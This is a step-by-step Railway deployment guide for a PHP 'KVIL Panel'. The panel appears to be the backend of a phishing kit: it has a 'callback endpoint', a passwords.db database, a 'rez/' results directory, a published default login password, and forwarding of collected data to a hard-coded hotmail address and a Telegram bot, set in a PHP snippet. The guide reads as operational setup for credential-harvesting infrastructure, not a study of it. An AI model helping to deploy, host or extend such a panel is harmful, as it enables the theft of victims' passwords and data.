# 🚂 Railway Deployment Guide

## Step-by-Step Deployment Instructions

### Prerequisites
- GitHub account
- Railway account (free at [railway.app](https://railway.app))

---

## Step 1: Prepare Your Code

### 1.1 Initialize Git Repository (if not already done)

```bash
cd /path/to/your/callback/directory
git init
git add .
git commit -m "Initial commit for Railway deployment"
```

### 1.2 Create GitHub Repository

1. Go to [GitHub](https://github.com) and create a new repository
2. Name it (e.g., `kvil-panel`)
3. **Don't** initialize with README (you already have one)

### 1.3 Push to GitHub

```bash
git remote add origin https://github.com/YOUR_USERNAME/YOUR_REPO_NAME.git
git branch -M main
git push -u origin main
```

---

## Step 2: Deploy on Railway

### 2.1 Sign Up / Login

1. Go to [railway.app](https://railway.app)
2. Click "Login" or "Start a New Project"
3. Sign in with your **GitHub account** (recommended)

### 2.2 Create New Project

1. Click **"New Project"** button
2. Select **"Deploy from GitHub repo"**
3. Authorize Railway to access your GitHub (if first time)
4. Select your repository from the list
5. Click **"Deploy Now"**

### 2.3 Railway Auto-Detection

Railway will automatically:
- ✅ Detect PHP
- ✅ Install dependencies
- ✅ Start your application
- ✅ Assign a public URL

**Wait 2-3 minutes for deployment to complete**

---

## Step 3: Configure Your Application

### 3.1 Get Your Railway URL

1. In Railway dashboard, click on your project
2. Click on the service/deployment
3. You'll see a URL like: `your-app-production.up.railway.app`
4. Click the URL to open it in a new tab

### 3.2 Initialize Database

1. Visit: `https://your-app.railway.app/create_db.php`
2. You should see: "Database and tables created successfully!"
3. **Important**: Only run this once!

### 3.3 Access Your Panel

1. Visit: `https://your-app.railway.app/check.php`
2. Login with default password: `HitTheGroundRunning.exe`
3. **Change password immediately** after first login

### 3.4 Configure Telegram (Optional)

1. In the panel, click **Settings** in the sidebar
2. Enter your Telegram bot token
3. Enter your Telegram chat ID
4. Click **Save Settings**

---

## Step 4: Set Up Custom Domain (Optional)

### 4.1 Add Custom Domain

1. In Railway dashboard → Your project → Settings
2. Scroll to "Domains"
3. Click "Generate Domain" or "Add Custom Domain"
4. Follow the instructions

### 4.2 SSL Certificate

Railway automatically provides HTTPS/SSL certificates - no configuration needed!

---

## Step 5: Environment Variables (Optional)

If you want to use environment variables instead of hardcoded values:

1. In Railway dashboard → Your project → Variables
2. Add variables:
   - `EMAIL_ADDRESS` = your email
   - `TELEGRAM_BOT_TOKEN` = your bot token
   - `TELEGRAM_CHAT_ID` = your chat ID

Then update `index.php` to read from environment:
```php
$send = getenv('EMAIL_ADDRESS') ?: 'suka.w1@hotmail.com';
$bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: '';
$chat_id = getenv('TELEGRAM_CHAT_ID') ?: '';
```

---

## Troubleshooting

### Database Not Working

1. Make sure you ran `create_db.php` once
2. Check Railway logs for errors
3. Verify SQLite extension is available (it should be by default)

### Files Not Saving

1. Check Railway logs
2. Verify `rez/` directory permissions
3. The directory should auto-create on first use

### Can't Access Panel

1. Check Railway deployment status (should be "Active")
2. Verify the URL is correct
3. Check Railway logs for startup errors

### Viewing Logs

1. In Railway dashboard → Your project
2. Click on the deployment
3. Click "Logs" tab
4. See real-time logs and errors

---

## Updating Your Application

### Push Updates

```bash
git add .
git commit -m "Your update message"
git push origin main
```

Railway will automatically:
- ✅ Detect the push
- ✅ Rebuild your application
- ✅ Deploy the new version
- ✅ Keep your database and files intact

---

## Important Notes

### ✅ What Works on Railway

- SQLite database (persists between deployments)
- File logging to `rez/` directory
- Sessions (work normally)
- All PHP features
- HTTPS/SSL (automatic)

### ⚠️ Things to Remember

- Database file (`passwords.db`) is in `.gitignore` - it won't be in git
- Railway creates a fresh database on first deploy
- Run `create_db.php` once after deployment
- Your data persists between deployments
- Free tier has usage limits (check Railway pricing)

### 🔒 Security

- Change default password immediately
- Railway provides HTTPS automatically
- Keep your Telegram credentials secure
- Don't commit sensitive data to git

---

## Railway Free Tier Limits

- **$5 credit per month** (free)
- **500 hours** of usage
- **Sufficient for small to medium traffic**

If you exceed limits, Railway will pause your service. Upgrade to paid plan for unlimited usage.

---

## Support

- Railway Docs: [docs.railway.app](https://docs.railway.app)
- Railway Discord: [discord.gg/railway](https://discord.gg/railway)
- Check deployment logs in Railway dashboard

---

## Quick Reference

| Action | URL |
|--------|-----|
| Panel Login | `https://your-app.railway.app/check.php` |
| Callback Endpoint | `https://your-app.railway.app/index.php` |
| Initialize DB | `https://your-app.railway.app/create_db.php` |
| Default Password | `HitTheGroundRunning.exe` |

---

**🎉 Congratulations! Your KVIL Panel is now live on Railway!**

